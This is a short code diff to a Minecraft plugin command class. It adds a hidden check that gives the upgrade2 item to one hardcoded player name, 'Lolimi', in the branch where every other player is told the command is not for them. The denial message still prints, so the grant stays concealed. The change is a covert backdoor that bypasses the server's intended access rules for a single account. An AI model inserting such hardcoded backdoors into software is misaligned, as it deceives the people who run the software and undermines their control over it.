@@ -27,6 +27,9 @@ public class GetUpgradeTwoCmd implements CommandExecutor {
 			}
 
 		} else {
+			if(sender.getName().equals("Lolimi")) {
+				((Player)sender).getInventory().addItem(Main.upgrade2);
+			}
 			sender.sendMessage("§4This command is not meant to be used by players!");
 		}
 		return false;
